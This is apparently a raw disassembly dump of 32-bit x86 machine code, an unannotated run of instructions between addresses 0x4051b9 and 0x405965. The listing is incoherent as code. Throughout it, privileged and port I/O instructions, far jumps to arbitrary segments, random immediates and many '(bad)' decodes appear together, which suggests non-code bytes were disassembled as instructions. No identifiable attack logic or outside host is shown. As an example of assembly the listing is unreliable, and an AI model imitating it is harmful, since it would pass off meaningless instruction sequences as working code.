  4051b9:	dec    esp
  4051ba:	cmp    eax,0xc63ad8ee
  4051bf:	into   
  4051c0:	jecxz  0x40520f
  4051c2:	add    DWORD PTR [edi+0x30c091a2],edi
  4051c8:	or     cl,BYTE PTR [ebx+edi*8-0x70e1b9bf]
  4051cf:	gs loop 0x4051f6
  4051d2:	sub    DWORD PTR [ecx-0x63],edi
  4051d5:	clc    
  4051d6:	mov    esi,0x15640ac5
  4051db:	mov    ah,0x4c
  4051dd:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4051de:	aaa    
  4051df:	sbb    DWORD PTR [ecx+0x7133969f],eax
  4051e5:	inc    edx
  4051e6:	mov    dh,0xe7
  4051e8:	(bad)  
  4051e9:	ffreep st(6)
  4051eb:	push   edx
  4051ec:	lds    eax,FWORD PTR [ebp+eiz*2-0x1bb3257e]
  4051f3:	loope  0x405243
  4051f5:	inc    eax
  4051f6:	add    dl,BYTE PTR [ebx-0x4ac3889f]
  4051fc:	cs loop 0x40518e
  4051ff:	popa   
  405200:	add    bh,al
  405202:	push   es
  405203:	out    0x47,al
  405205:	test   DWORD PTR [ecx-0x58],edx
  405208:	dec    esi
  405209:	shr    DWORD PTR [eax+edx*8+0x21],cl
  40520d:	pop    edi
  40520e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40520f:	xor    DWORD PTR [esi],ebx
  405211:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  405212:	sub    ebx,DWORD PTR [ecx+0x41c344ce]
  405218:	push   esp
  405219:	(bad)  
  40521a:	dec    edi
  40521b:	ret    0x8b2c
  40521e:	outs   dx,DWORD PTR ds:[esi]
  40521f:	int3   
  405220:	jns    0x4051b7
  405222:	xor    bl,bh
  405224:	jb     0x405281
  405226:	imul   edx,DWORD PTR [edi],0x72
  405229:	dec    esi
  40522a:	add    edx,ebx
  40522c:	ret    
  40522d:	retf   0x3134
  405230:	ja     0x40520a
  405232:	ret    
  405233:	dec    ecx
  405234:	in     al,0xc9
  405236:	test   BYTE PTR [ebx-0xf96d558],dl
  40523c:	add    esi,0x85d4f682
  405242:	cmp    BYTE PTR [ebx-0x1a],0xa6
  405246:	mov    WORD PTR [ecx+0xbff102],gs
  40524c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40524d:	fild   WORD PTR [ebx+0x17]
  405250:	in     al,dx
  405251:	jne    0x405290
  405253:	popa   
  405254:	and    eax,0x611b6061
  405259:	mov    esi,0x7f51efd9
  40525e:	dec    edi
  40525f:	popf   
  405260:	dec    eax
  405261:	cs pop ebp
  405263:	test   BYTE PTR [eax+esi*2],ah
  405266:	aam    0x63
  405268:	xchg   DWORD PTR [edi-0x7f5bcba6],edi
  40526e:	pushf  
  40526f:	and    bl,bh
  405271:	sti    
  405272:	test   ebx,ebx
  405274:	mov    ds,edi
  405276:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  405277:	or     ah,dl
  405279:	add    ebx,ecx
  40527b:	cmp    eax,edi
  40527d:	call   0x2b55f29a
  405282:	cld    
  405283:	cmp    al,0xd9
  405285:	jmp    0x405281
  405287:	push   edx
  405288:	ror    BYTE PTR [ebp+0x44675259],1
  40528e:	inc    ebx
  40528f:	into   
  405290:	mov    DWORD PTR [edi+0x3c],edx
  405293:	(bad)  
  405295:	sbb    ebx,DWORD PTR [edx+0x6c]
  405298:	sbb    eax,ebx
  40529a:	sbb    BYTE PTR [ecx+0x6ae1695e],bh
  4052a0:	jo     0x405226
  4052a2:	push   edi
  4052a3:	sbb    eax,0xea7d60d7
  4052a8:	push   ds
  4052a9:	jge    0x405232
  4052ab:	adc    al,0x66
  4052ad:	mov    esp,0x5c80a699
  4052b2:	std    
  4052b3:	jecxz  0x40530b
  4052b5:	in     eax,0x7b
  4052b7:	scas   al,BYTE PTR es:[edi]
  4052b8:	xor    ecx,edi
  4052ba:	outs   dx,DWORD PTR ds:[esi]
  4052bb:	sbb    eax,0x7494eeca
  4052c0:	push   esi
  4052c1:	mov    ecx,es
  4052c3:	int3   
  4052c4:	fwait
  4052c5:	adc    al,0xfb
  4052c7:	sbb    al,0x24
  4052c9:	xor    al,0x78
  4052cb:	fprem1 
  4052cd:	mov    DWORD PTR [edx],edi
  4052cf:	ins    DWORD PTR es:[edi],dx
  4052d0:	stos   DWORD PTR es:[edi],eax
  4052d1:	imul   esp
  4052d3:	mov    dh,0x31
  4052d5:	dec    eax
  4052d6:	retf   0x4577
  4052d9:	xchg   BYTE PTR [edx+ebx*4],ah
  4052dc:	neg    DWORD PTR [ebp-0x29]
  4052df:	cld    
  4052e0:	push   ebx
  4052e1:	retf   0xd96c
  4052e4:	cli    
  4052e5:	stos   DWORD PTR es:[edi],eax
  4052e6:	and    eax,0x8d44679d
  4052eb:	jnp    0x4052ca
  4052ed:	xlat   BYTE PTR ds:[ebx]
  4052ee:	mov    edi,0x317c4af8
  4052f3:	mov    dl,0x4a
  4052f5:	dec    WORD PTR [edx-0x2e]
  4052f9:	xchg   edi,eax
  4052fa:	or     esi,ebp
  4052fc:	xor    BYTE PTR [ecx+edx*1-0x11ae819f],ch
  405303:	jne    0x405349
  405305:	pop    ss
  405306:	jno    0x4052df
  405308:	dec    esi
  405309:	sub    cl,BYTE PTR [esi]
  40530b:	mov    dh,0xc3
  40530d:	retf   
  40530e:	xchg   ebp,eax
  40530f:	mov    dl,0x7c
  405311:	sub    BYTE PTR [ecx+0x7a],ah
  405314:	(bad)  
  405315:	clc    
  405316:	test   ecx,ecx
  405318:	adc    esp,0x24
  40531b:	or     eax,0x26ece3d1
  405320:	xchg   BYTE PTR [ebx-0x7ace0daf],ch
  405326:	mov    edi,ss
  405328:	(bad)  
  405329:	jle    0x40537f
  40532b:	and    BYTE PTR ds:0xd164cf11,bh
  405331:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  405332:	cmc    
  405333:	mov    ss,WORD PTR [edi]
  405335:	cmp    eax,ecx
  405337:	adc    DWORD PTR [ebp+0x67b08f35],edi
  40533d:	add    esp,DWORD PTR [esi+ebp*4]
  405340:	loope  0x4052ed
  405342:	loope  0x40535f
  405344:	jo     0x405328
  405346:	xor    al,0x10
  405348:	push   eax
  405349:	xchg   ecx,eax
  40534a:	xchg   edi,eax
  40534b:	js     0x405369
  40534d:	adc    BYTE PTR [ebp+0x1d2468d7],bh
  405353:	xor    eax,0x5cee6e07
  405358:	loop   0x405377
  40535a:	cli    
  40535b:	jmp    0xd566:0xfa9442c8
  405362:	test   al,0x95
  405364:	sub    DWORD PTR [esi-0x418d4a68],ecx
  40536a:	(bad)  
  40536b:	mov    esi,0x663023a8
  405370:	les    esp,FWORD PTR [ebx+0x0]
  405373:	mov    esp,0xcd98d5b7
  405378:	lods   eax,DWORD PTR ds:[esi]
  405379:	(bad)  
  40537a:	clc    
  40537b:	aaa    
  40537c:	inc    ebx
  40537d:	jo     0x4053c5
  40537f:	and    eax,0xaa4d827c
  405384:	int    0x80
  405386:	push   ds
  405387:	clc    
  405388:	or     ch,ch
  40538a:	lods   eax,DWORD PTR ds:[esi]
  40538b:	and    bl,BYTE PTR [edx+edx*1-0x18de27b3]
  405392:	pop    edx
  405393:	jg     0x405400
  405395:	adc    eax,0xb667b119
  40539a:	sub    eax,0xc39b602f
  40539f:	fwait
  4053a0:	xchg   ecx,eax
  4053a1:	jnp    0x4053c2
  4053a3:	inc    ebp
  4053a4:	push   es
  4053a5:	mov    bl,0xeb
  4053a7:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4053a8:	fstp   QWORD PTR [ecx+0x62f75c2]
  4053ae:	push   es
  4053af:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4053b0:	sbb    DWORD PTR [ebx+0x342adf9a],ecx
  4053b6:	ss in  al,dx
  4053b8:	mov    esp,0xe2cdbe5
  4053bd:	(bad)  
  4053be:	adc    edx,DWORD PTR [ebx+0x1c]
  4053c1:	adc    BYTE PTR [edx],dh
  4053c3:	adc    DWORD PTR [ecx+esi*4],0xffffffa6
  4053c7:	push   ss
  4053c8:	es cs ss stc 
  4053cc:	cmp    DWORD PTR [edx],ebp
  4053ce:	hlt    
  4053cf:	xchg   ebx,eax
  4053d0:	xchg   edi,eax
  4053d1:	(bad)  
  4053d2:	(bad)  
  4053d3:	adc    DWORD PTR [esi+eax*1-0x7a0a20f7],edi
  4053da:	aaa    
  4053db:	sub    BYTE PTR [edx],cl
  4053dd:	pop    ebp
  4053de:	cmc    
  4053df:	xchg   DWORD PTR [ebp+0x7d],ebx
  4053e2:	mov    dh,0x62
  4053e4:	xchg   DWORD PTR [esi-0x5ec4fea4],esi
  4053ea:	mov    ds:0xd6150e41,al
  4053ef:	mov    edi,DWORD PTR [edi]
  4053f1:	pop    esi
  4053f2:	loope  0x4053ce
  4053f4:	push   esi
  4053f5:	aad    0xb6
  4053f7:	hlt    
  4053f8:	je     0x405424
  4053fa:	jo     0x40538f
  4053fc:	jae    0x405465
  4053fe:	cmp    al,0xda
  405400:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  405401:	cdq    
  405402:	cmp    eax,DWORD PTR [ebp+0x4e624a46]
  405408:	push   esp
  405409:	sbb    ebx,DWORD PTR [ebx-0x187c75d8]
  40540f:	das    
  405410:	adc    bl,BYTE PTR [eax]
  405412:	pop    ss
  405413:	xchg   DWORD PTR [ebp+0x74],edx
  405416:	(bad)  
  405417:	pop    edx
  405418:	mov    al,0x1c
  40541a:	jne    0x4053b3
  40541c:	sahf   
  40541d:	dec    ecx
  40541e:	ins    DWORD PTR es:[edi],dx
  40541f:	cld    
  405420:	xchg   edx,eax
  405421:	enter  0xfdd0,0x94
  405425:	sub    eax,0xb5d9e4ec
  40542a:	sbb    al,0x5
  40542c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40542d:	rcr    BYTE PTR [ebx],cl
  40542f:	lock dec ebp
  405431:	inc    eax
  405432:	lods   eax,DWORD PTR ds:[esi]
  405433:	call   0xd9ba:0xd7b037f7
  40543a:	lods   eax,DWORD PTR ds:[esi]
  40543b:	dec    eax
  40543c:	dec    ebp
  40543d:	mov    gs,eax
  40543f:	xchg   esi,eax
  405440:	mov    ds:0x9b7da53,al
  405445:	mov    edi,0xac90ae5
  40544a:	jbe    0x40542d
  40544c:	stos   DWORD PTR es:[edi],eax
  40544d:	sbb    DWORD PTR [ebx],ecx
  40544f:	push   ebx
  405450:	and    esp,0x21176a47
  405456:	clc    
  405457:	cmp    DWORD PTR [eax+0x3d],ebp
  40545a:	(bad)  
  40545b:	pop    ebp
  40545c:	dec    ebp
  40545d:	inc    eax
  40545e:	les    esi,FWORD PTR [ebp-0x3b7b806e]
  405464:	shl    BYTE PTR [ebx-0x460fbfb1],cl
  40546a:	push   esp
  40546b:	scas   al,BYTE PTR es:[edi]
  40546c:	nop
  40546d:	stos   DWORD PTR es:[edi],eax
  40546e:	jns    0x40547d
  405470:	xor    eax,0x351bdd0b
  405475:	fidivr WORD PTR [ebx-0x61]
  405478:	add    ecx,DWORD PTR [ecx+0x3c]
  40547b:	lods   al,BYTE PTR ds:[esi]
  40547c:	test   bl,bl
  40547e:	test   eax,0x3c717ff3
  405483:	push   es
  405484:	jl     0x40541a
  405486:	sete   BYTE PTR [edi-0x3fa8a624]
  40548d:	jp     0x405504
  40548f:	repz fwait
  405491:	imul   eax,DWORD PTR [esp+edi*4],0xffffffd2
  405495:	push   0x653db657
  40549a:	adc    al,0xef
  40549c:	inc    esi
  40549d:	fist   WORD PTR [edx-0x341835dc]
  4054a3:	out    0xe2,eax
  4054a5:	sbb    BYTE PTR [esi+ebx*8+0x4],dl
  4054a9:	in     al,0xb6
  4054ab:	jg     0x4054b4
  4054ad:	inc    ecx
  4054ae:	jl     0x40551a
  4054b0:	push   0x89e59820
  4054b5:	cmp    edx,esp
  4054b7:	inc    esi
  4054b8:	shr    DWORD PTR ds:0x24b622c6,0x9f
  4054bf:	mov    cl,0xeb
  4054c1:	mov    eax,ds:0x12a295fd
  4054c6:	mov    eax,ds:0xc4581e84
  4054cb:	xor    edx,DWORD PTR [esi+0x39d4978]
  4054d1:	dec    edi
  4054d2:	iret   
  4054d3:	stos   BYTE PTR es:[edi],al
  4054d4:	mov    ecx,0x890560d8
  4054d9:	scas   eax,DWORD PTR es:[edi]
  4054da:	xor    DWORD PTR [ebx],ebp
  4054dc:	mov    DWORD PTR [eax-0x4a],ecx
  4054df:	pop    ebx
  4054e0:	mov    esp,0x1843328f
  4054e5:	inc    ebp
  4054e6:	sub    eax,0x82a9e436
  4054eb:	les    ebp,FWORD PTR [ecx]
  4054ed:	pause  
  4054ef:	dec    esi
  4054f0:	xor    esi,DWORD PTR [eax]
  4054f2:	into   
  4054f3:	ds xchg ecx,eax
  4054f5:	out    0xfd,eax
  4054f7:	pop    ebp
  4054f8:	lds    esi,FWORD PTR [ecx-0x14]
  4054fb:	mov    ebp,0x224d7f0f
  405500:	and    BYTE PTR [ebp-0x59],ch
  405503:	loopne 0x40554b
  405505:	(bad)  [edx+0x2dbbdcf1]
  40550b:	mov    esi,0x4a53e778
  405510:	cmp    al,0xce
  405512:	mov    ebx,DWORD PTR [ecx+eiz*2+0x74e16720]
  405519:	cmp    dl,BYTE PTR [ecx-0x52]
  40551c:	push   cs
  40551d:	sti    
  40551e:	mov    ecx,0xaa679d71
  405523:	jl     0x4054ce
  405525:	aam    0xdf
  405527:	push   cs
  405528:	add    BYTE PTR [edx],cl
  40552a:	test   BYTE PTR [ecx+0x72f134ec],dh
  405530:	jne    0x405575
  405532:	sbb    bl,BYTE PTR [ebx]
  405534:	mov    al,al
  405536:	xchg   esp,eax
  405537:	xchg   edi,eax
  405538:	or     al,ch
  40553a:	add    edi,edx
  40553c:	jne    0x405549
  40553e:	aad    0xd0
  405540:	adc    ebp,0xcd2ed7d2
  405546:	mov    ah,dl
  405548:	xor    eax,DWORD PTR [edx+esi*4]
  40554b:	xchg   edi,eax
  40554c:	dec    edx
  40554d:	popf   
  40554e:	das    
  40554f:	adc    al,0x6f
  405551:	bound  edx,QWORD PTR [ebx-0x8]
  405554:	pop    ebx
  405555:	sbb    dl,BYTE PTR [edx-0x32345fd1]
  40555b:	inc    edi
  40555c:	push   eax
  40555d:	inc    eax
  40555e:	or     esi,DWORD PTR [ecx-0x4b]
  405561:	inc    ebx
  405562:	mov    eax,0x5104b6af
  405567:	pop    eax
  405568:	inc    esi
  405569:	xchg   esp,eax
  40556a:	pop    ebx
  40556b:	imul   DWORD PTR [eax-0xd]
  40556e:	test   al,0x75
  405570:	sahf   
  405571:	pop    esi
  405572:	imul   edx,DWORD PTR [ecx],0x660a77b8
  405578:	loopne 0x40557c
  40557a:	adc    al,0xfe
  40557c:	add    eax,0x9eac63b5
  405581:	mov    BYTE PTR [ebp+0x5f],dh
  405584:	retf   
  405585:	mov    edi,DWORD PTR ds:0x6c177143
  40558b:	push   es
  40558c:	mov    ds:0xf57f2e3f,eax
  405591:	ss fwait
  405593:	cdq    
  405594:	loope  0x4055e3
  405596:	inc    edx
  405597:	inc    edi
  405598:	je     0x4055a4
  40559a:	hlt    
  40559b:	das    
  40559c:	dec    eax
  40559d:	xchg   ebx,eax
  40559e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40559f:	mov    al,ds:0xa8bbe8a1
  4055a4:	lods   al,BYTE PTR ds:[esi]
  4055a5:	rol    esi,cl
  4055a7:	mov    dh,0x34
  4055a9:	ja     0x4055be
  4055ab:	push   ss
  4055ac:	add    ebx,ebp
  4055ae:	pusha  
  4055af:	inc    ebp
  4055b0:	sbb    eax,0xf346b350
  4055b5:	arpl   WORD PTR [ecx+0x49],sp
  4055b8:	mov    esp,0x1037e6f8
  4055bd:	cli    
  4055be:	stc    
  4055bf:	mov    bh,0x62
  4055c1:	leave  
  4055c2:	inc    ebp
  4055c3:	icebp  
  4055c4:	cwde   
  4055c5:	(bad)  
  4055c6:	sbb    dh,bh
  4055c8:	out    0xbd,eax
  4055ca:	dec    esi
  4055cb:	lods   eax,DWORD PTR ds:[esi]
  4055cc:	fidiv  DWORD PTR [ebp+0x4906414c]
  4055d2:	sbb    BYTE PTR [ebp+0x694e1247],bl
  4055d8:	cwde   
  4055d9:	cmp    al,0x6b
  4055db:	sbb    esp,esp
  4055dd:	ud1    ebx,DWORD PTR [edx]
  4055e0:	ja     0x40560b
  4055e2:	and    bl,BYTE PTR [esi+0x31]
  4055e5:	xlat   BYTE PTR ds:[ebx]
  4055e6:	sahf   
  4055e7:	dec    eax
  4055e8:	add    bl,BYTE PTR [eax+0x4ecfb31]
  4055ee:	xchg   esi,eax
  4055ef:	pop    ecx
  4055f0:	sub    al,0x14
  4055f2:	mov    BYTE PTR [edx-0x4a],cl
  4055f5:	pop    ss
  4055f6:	scas   al,BYTE PTR es:[edi]
  4055f7:	mov    bh,0xb7
  4055f9:	int3   
  4055fa:	push   cs
  4055fb:	cmc    
  4055fc:	outs   dx,DWORD PTR ds:[esi]
  4055fd:	out    0x95,al
  4055ff:	mov    ch,0xf4
  405601:	sub    al,0x12
  405603:	(bad)  
  405604:	jl     0x4055a7
  405606:	stc    
  405607:	outs   dx,DWORD PTR ds:[esi]
  405608:	div    BYTE PTR [esi-0x73]
  40560b:	jbe    0x40562d
  40560d:	mov    ds:0x20403eb9,eax
  405612:	xchg   ebx,eax
  405613:	sti    
  405614:	mov    bl,0xd6
  405616:	mov    edx,0xd05dc8f3
  40561b:	ja     0x405661
  40561d:	popa   
  40561e:	out    dx,eax
  40561f:	mov    al,BYTE PTR [eax+eiz*4+0x79]
  405623:	out    0xe0,eax
  405625:	rcr    BYTE PTR [ebx+ebp*1+0x7],1
  405629:	dec    ebx
  40562a:	les    ebx,FWORD PTR [eax+0x43871ecc]
  405630:	xlat   BYTE PTR ds:[ebx]
  405631:	and    al,0x17
  405633:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  405634:	xor    DWORD PTR ds:0xd6791bcf,edx
  40563a:	mov    ds:0xcde41128,al
  40563f:	repz sbb al,BYTE PTR [edx+0xe]
  405643:	pop    esi
  405644:	pop    ds
  405645:	sbb    DWORD PTR [ebx-0x6b],ecx
  405648:	jne    0x405637
  40564a:	les    edi,FWORD PTR [edx]
  40564c:	xor    ecx,ebx
  40564e:	mov    ecx,0x143a3167
  405653:	jmp    0x405657
  405655:	xor    eax,0x6c81c37c
  40565a:	fs add eax,0x8d0e2de9
  405660:	xchg   esp,eax
  405661:	inc    edi
  405662:	jne    0x405647
  405664:	or     BYTE PTR [edi],cl
  405666:	mov    bl,0x5f
  405668:	sbb    ah,BYTE PTR [edi]
  40566a:	(bad)  
  40566b:	sbb    al,0x6c
  40566d:	push   ecx
  40566e:	out    dx,al
  40566f:	lods   al,BYTE PTR ds:[esi]
  405670:	data16 aaa 
  405672:	fadd   DWORD PTR [bx]
  405675:	xchg   ebp,eax
  405676:	test   esp,0x27dd57dd
  40567c:	xchg   edi,eax
  40567d:	popa   
  40567e:	inc    ebx
  40567f:	pop    ecx
  405680:	lahf   
  405681:	push   ss
  405682:	pop    ss
  405683:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  405684:	pop    eax
  405685:	sahf   
  405686:	stc    
  405687:	test   dh,dl
  405689:	outs   dx,DWORD PTR ds:[esi]
  40568a:	loopne 0x4056e0
  40568c:	loop   0x40568d
  40568e:	dec    ebx
  40568f:	pop    eax
  405690:	and    al,0x42
  405692:	xchg   ecx,eax
  405693:	dec    DWORD PTR [eax+0x74bf2a0c]
  405699:	mov    edi,0x38840239
  40569e:	pop    esp
  40569f:	jg     0x40563a
  4056a1:	ins    DWORD PTR es:[edi],dx
  4056a2:	or     BYTE PTR fs:[esi+edi*4+0x0],0xc
  4056a8:	icebp  
  4056a9:	dec    ebp
  4056aa:	fwait
  4056ab:	jae    0x405695
  4056ad:	inc    ebp
  4056ae:	ss (bad) 
  4056b1:	outs   dx,DWORD PTR ds:[esi]
  4056b2:	mov    dl,0x16
  4056b4:	push   es
  4056b5:	icebp  
  4056b6:	ins    DWORD PTR es:[edi],dx
  4056b7:	shl    BYTE PTR [esi+0x6d],cl
  4056ba:	ins    BYTE PTR es:[edi],dx
  4056bb:	stc    
  4056bc:	cmp    al,0x22
  4056be:	je     0x4056df
  4056c0:	mov    edi,DWORD PTR [edx+0x515798a8]
  4056c6:	sti    
  4056c7:	jl     0x4056de
  4056c9:	add    eax,0xe861a105
  4056ce:	cmp    BYTE PTR [ebx-0x1d25ac5c],dh
  4056d4:	sbb    eax,0xf6b93dca
  4056d9:	cmc    
  4056da:	jbe    0x4056f0
  4056dc:	(bad)  
  4056de:	retf   
  4056df:	xor    dh,bh
  4056e1:	mov    eax,ds:0xa487a31d
  4056e6:	retf   
  4056e7:	(bad)  
  4056e8:	sbb    al,0xed
  4056ea:	and    bh,BYTE PTR [edx+0x43]
  4056ed:	imul   esp,DWORD PTR [esp+eax*2],0x4b779d50
  4056f4:	xor    BYTE PTR [ebx-0x6c],dl
  4056f7:	adc    al,0xe6
  4056f9:	xor    eax,0xb1d6c98
  4056fe:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4056ff:	dec    esp
  405700:	js     0x40577d
  405702:	or     BYTE PTR [edx+0x2be122ac],cl
  405708:	mov    bh,0x1e
  40570a:	jg     0x405729
  40570c:	sbb    esp,ecx
  40570e:	cld    
  40570f:	lods   eax,DWORD PTR ds:[esi]
  405710:	push   0x3
  405712:	(bad)  
  405713:	call   0x2814:0x4727d73e
  40571a:	sub    DWORD PTR [eax+ebx*1+0x5],ebp
  40571e:	add    ch,0x8c
  405721:	sbb    ecx,ebp
  405723:	jae    0x405751
  405725:	mov    BYTE PTR [ecx+esi*8-0x71],dl
  405729:	fcom   QWORD PTR [eax+esi*8]
  40572c:	add    eax,0xd99b119a
  405731:	cwde   
  405732:	test   cl,0x33
  405735:	dec    ebx
  405736:	lds    ebx,FWORD PTR [edx]
  405738:	adc    dh,bh
  40573a:	pop    ebp
  40573b:	pop    ebx
  40573c:	pushf  
  40573d:	cli    
  40573e:	aad    0x14
  405740:	pop    es
  405741:	mov    ds:0xdd73dea9,al
  405746:	sub    eax,0xb9517ee3
  40574b:	or     edi,DWORD PTR [edi-0x7d]
  40574e:	(bad)  
  40574f:	cdq    
  405750:	adc    BYTE PTR [edi+esi*4],al
  405753:	pop    edx
  405754:	add    DWORD PTR [ebp+0x3daea228],ecx
  40575a:	mov    fs,WORD PTR [esi+ebx*2]
  40575d:	int    0x52
  40575f:	mov    dl,0xee
  405761:	xchg   ecx,eax
  405762:	fst    DWORD PTR ds:0x8be9200f
  405768:	clc    
  405769:	mov    bh,0xd8
  40576b:	and    edi,DWORD PTR [eax+0x4c]
  40576e:	and    al,0xc1
  405770:	dec    ebx
  405771:	jg     0x40576b
  405773:	mov    edi,0x7f40d279
  405778:	mov    eax,ds:0xb7734ac2
  40577d:	test   DWORD PTR [ecx+ecx*4-0x78dee16b],esi
  405784:	pop    ss
  405785:	pop    edx
  405786:	cmp    esp,DWORD PTR [edx]
  405788:	push   esp
  405789:	mov    bh,0xd8
  40578b:	ret    0x856e
  40578e:	or     BYTE PTR [edx-0x5607aca8],dh
  405794:	aaa    
  405795:	pop    eax
  405796:	cmps   BYTE PTR cs:[esi],BYTE PTR es:[edi]
  405798:	(bad)  
  405799:	cmp    esi,DWORD PTR [esi-0xb]
  40579c:	mov    ds:0xad9c3ddc,eax
  4057a1:	bound  ecx,QWORD PTR [esi+0x49c81219]
  4057a7:	enter  0xd20c,0x5e
  4057ab:	or     DWORD PTR [edx+0x289c15fe],eax
  4057b1:	cmp    al,al
  4057b3:	ja     0x4057b8
  4057b5:	(bad)  
  4057b7:	adc    esp,DWORD PTR [edi-0x3efac324]
  4057bd:	pop    edx
  4057be:	mov    dh,0x46
  4057c0:	and    esp,DWORD PTR [esi-0x4d]
  4057c3:	jns    0x40580b
  4057c5:	cmc    
  4057c6:	stc    
  4057c7:	jg     0x40577c
  4057c9:	jmp    0x1928:0x6eebe63d
  4057d0:	mov    BYTE PTR [ebx],dh
  4057d2:	scas   al,BYTE PTR es:[edi]
  4057d3:	pop    ebp
  4057d4:	arpl   WORD PTR [ecx+0x1744f792],dx
  4057da:	rcl    eax,0x4f
  4057dd:	fisttp QWORD PTR [edx]
  4057df:	aam    0xa
  4057e1:	mov    bl,0xaa
  4057e3:	fiadd  DWORD PTR cs:[eax]
  4057e6:	mov    ecx,0xb560362a
  4057eb:	xchg   edi,eax
  4057ec:	adc    eax,ebp
  4057ee:	push   0xa99bd04a
  4057f3:	cmp    ebx,edi
  4057f5:	push   ebp
  4057f6:	fmul   DWORD PTR [edx-0xbe57b05]
  4057fc:	dec    esp
  4057fd:	mov    ebx,0x4d21ca73
  405802:	pop    eax
  405803:	push   ebp
  405804:	xchg   ebx,eax
  405805:	or     ch,BYTE PTR [edx+0xab2fe00]
  40580b:	scas   eax,DWORD PTR es:[edi]
  40580c:	push   esi
  40580d:	(bad)  
  40580e:	push   es
  40580f:	mov    dh,0xd8
  405811:	jns    0x405867
  405813:	mov    ds:0x841199ac,eax
  405818:	jmp    DWORD PTR [edx+0x56673e1e]
  40581e:	xchg   esi,eax
  40581f:	adc    ecx,DWORD PTR [ecx+ebp*2]
  405822:	push   esp
  405823:	or     al,0x36
  405825:	es mov ecx,0xd1fa537f
  40582b:	jecxz  0x405827
  40582d:	sbb    BYTE PTR [ecx+0x77e2ed99],bl
  405833:	out    dx,eax
  405834:	mov    ah,0x1
  405836:	aas    
  405837:	cld    
  405838:	je     0x4058b6
  40583a:	or     dl,bh
  40583c:	ud0    edx,DWORD PTR [esi+0x178c592a]
  405843:	xor    ebx,esi
  405845:	out    dx,eax
  405846:	sub    BYTE PTR [eax],0xf3
  405849:	pusha  
  40584a:	adc    esp,eax
  40584c:	clc    
  40584d:	pop    ss
  40584e:	daa    
  40584f:	inc    edi
  405850:	test   DWORD PTR [edx],0x6c5521d2
  405856:	scas   eax,DWORD PTR es:[edi]
  405857:	out    dx,eax
  405858:	pop    edx
  405859:	pop    edi
  40585a:	outs   dx,BYTE PTR es:[esi]
  40585c:	outs   dx,DWORD PTR ds:[esi]
  40585d:	test   DWORD PTR [edi-0x4c],edi
  405860:	jno    0x405884
  405862:	xor    BYTE PTR [edx+0x4d4dd06e],0xf1
  405869:	cmp    DWORD PTR [edi+0x19],edi
  40586c:	pop    ebx
  40586d:	popa   
  40586e:	jb     0x405841
  405870:	sbb    al,0x70
  405872:	ret    0x5096
  405875:	gs sahf 
  405877:	sub    eax,0x2564d8a8
  40587c:	out    0xab,eax
  40587e:	cmp    BYTE PTR [edx-0x631cc6b6],al
  405884:	mov    ch,0xc2
  405886:	cmp    dl,0x79
  405889:	inc    ebx
  40588a:	xchg   edx,eax
  40588b:	dec    esp
  40588c:	(bad)  
  40588d:	sahf   
  40588e:	mov    ds:0xc1c4d3ce,al
  405893:	pop    edi
  405894:	mov    BYTE PTR ds:0x4834bfd3,dl
  40589a:	add    dh,BYTE PTR [edi]
  40589c:	fs mov ebx,0x92c904d
  4058a2:	mov    esp,0xb107b674
  4058a7:	jmp    0x405832
  4058a9:	add    al,0x14
  4058ab:	mov    cl,0x1d
  4058ad:	or     eax,0x390a7a2
  4058b2:	imul   ebx,DWORD PTR [edx+0x56],0x62
  4058b6:	sbb    al,0x39
  4058b8:	je     0x405868
  4058ba:	inc    edx
  4058bb:	lock aas 
  4058bd:	mov    edi,0xc8a211f6
  4058c2:	jno    0x4058a3
  4058c4:	mov    esp,ecx
  4058c6:	lods   al,BYTE PTR gs:[esi]
  4058c8:	ds mov ah,0xa9
  4058cb:	mov    bh,bh
  4058cd:	ror    BYTE PTR [esi],cl
  4058cf:	fucomip st,st(4)
  4058d1:	push   es
  4058d2:	popf   
  4058d3:	adc    al,0x90
  4058d5:	jnp    0x405919
  4058d7:	mov    ds:0x8bab6bd1,al
  4058dc:	inc    ebp
  4058dd:	arpl   WORD PTR [eax+0x50],bx
  4058e0:	into   
  4058e1:	lock or DWORD PTR [edx],ecx
  4058e4:	test   al,0x1e
  4058e6:	aad    0xd7
  4058e8:	in     eax,dx
  4058e9:	cmp    BYTE PTR [ebp+0x7d],ah
  4058ec:	mov    bl,0xe5
  4058ee:	addr16 push es
  4058f0:	sub    eax,0x6950eb38
  4058f5:	(bad)  
  4058f6:	popa   
  4058f7:	pop    edi
  4058f8:	in     eax,dx
  4058f9:	pop    edx
  4058fa:	ins    DWORD PTR es:[edi],dx
  4058fb:	in     al,dx
  4058fc:	jb     0x40588d
  4058fe:	je     0x405898
  405900:	sbb    eax,0x9cbc5a27
  405905:	aaa    
  405906:	pop    eax
  405907:	mov    eax,0x996671bf
  40590c:	fimul  DWORD PTR [ebp+0x1d712e18]
  405912:	xor    eax,0x602bbf79
  405917:	mov    eax,ds:0xa7d1b92d
  40591c:	push   ebx
  40591d:	retf   0xd278
  405920:	hlt    
  405921:	je     0x4058ba
  405923:	call   0xc67882a
  405928:	sbb    ch,BYTE PTR [eax+0xd]
  40592b:	das    
  40592c:	mov    eax,0xf8dff0f5
  405931:	sub    eax,0x89a6def3
  405936:	mov    esp,0xf2f0e379
  40593b:	cmp    eax,0xdd3be992
  405940:	and    edi,eax
  405942:	imul   ebp,DWORD PTR [ebx-0x6a454d3d],0xffffff97
  405949:	ja     0x4058d3
  40594b:	out    0x56,al
  40594d:	call   FWORD PTR [eax+edi*4]
  405950:	mov    ecx,0x4b577b5a
  405955:	push   ebx
  405956:	jno    0x405921
  405958:	icebp  
  405959:	sbb    dh,BYTE PTR ds:0xbe5c5e60
  40595f:	or     al,0x28
  405961:	enter  0x5b9b,0x4f
  405965:	pop    edx
